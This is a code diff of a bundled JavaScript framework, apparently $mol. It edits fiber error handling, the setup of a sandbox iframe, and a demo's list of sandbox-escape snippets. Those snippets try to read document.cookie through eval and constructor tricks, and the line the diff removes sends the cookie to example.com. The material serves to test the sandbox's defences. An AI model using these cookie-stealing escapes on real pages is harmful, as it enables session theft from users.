@@ -1257,7 +1257,7 @@ var $;
         }
         push(value) {
             value = this.$.$mol_conform(value, this.value);
-            if (this.error || !Object.is(this.value, value)) {
+            if (this.error !== null || !Object.is(this.value, value)) {
                 if ($mol_fiber.logs)
                     this.$.$mol_log3_done({
                         place: this,
@@ -1331,6 +1331,8 @@ var $;
                 this.pull();
             }
             catch (error) {
+                if (Object(error) !== error)
+                    error = new Error(error);
                 if ('then' in error) {
                     if (!slave) {
                         const listener = () => this.wake();
@@ -1355,7 +1357,7 @@ var $;
                 slave.master = this;
             if (this.cursor > -2)
                 this.update();
-            if (this.error)
+            if (this.error !== null)
                 return this.$.$mol_fail_hidden(this.error);
             return this.value;
         }
@@ -6465,7 +6467,7 @@ var $;
             return "";
         }
         snippet_codes() {
-            return ["return document.cookie", "let evil = eval\nreturn evil( 'document.cookie' )", "let Function = ( function*(){} ).constructor\nlet getCookie = Function( 'return document.cookie' )\nreturn getCookie().next().value", "let Function = sin.constructor\nlet getCookie = Function( 'return document.cookie' )\nreturn getCookie()", "let NumberProto = (0n).__proto__\nNumberProto.toString = null", "sin.call = ()=> 0\nreturn sin.call", "let script = 'location = \"https://example.com/\" + document.cookie'\nreturn import(`data:text/javascript;charset=utf-8,${script}`)"];
+            return ["return document.cookie", "let evil = eval\nreturn evil( 'document.cookie' )", "let Function = ( function*(){} ).constructor\nlet getCookie = Function( 'return document.cookie' )\nreturn getCookie().next().value", "let Function = sin.constructor\nlet getCookie = Function( 'return document.cookie' )\nreturn getCookie()", "let NumberProto = (0n).__proto__\nNumberProto.toString = null", "sin.call = ()=> 0\nreturn sin.call", "return import( 'https://example.org/' + PI )"];
         }
     }
     __decorate([
@@ -6562,7 +6564,6 @@ var $;
             if (this._make)
                 return this._make;
             const frame = $.$mol_dom_context.document.createElement('iframe');
-            frame.setAttribute('sandbox', `allow-same-origin`);
             frame.style.display = 'none';
             $.$mol_dom_context.document.body.appendChild(frame);
             const win = frame.contentWindow;
@@ -6591,6 +6592,7 @@ var $;
 				for( const key of Object.getOwnPropertyNames( window ) ) delete window[ key ]
 
 			`);
+            $.$mol_dom_context.document.body.removeChild(frame);
             let context_default = {};
             function clean(obj) {
                 for (let name of Object.getOwnPropertyNames(obj)) {
@@ -6712,10 +6714,9 @@ var $;
                 if (!this.script_to_execute())
                     return '';
                 $.$mol_dom_context.document.cookie = 'password=P@zzW0rd';
-                const async_func = this.func();
-                const sync_func = $.$mol_fiber_sync(async () => async_func());
-                const res = sync_func();
-                return String(res);
+                const func = this.func();
+                const res = func();
+                return typeof res + ': ' + String(res);
             }
             run() {
                 this.script_to_execute(this.script());
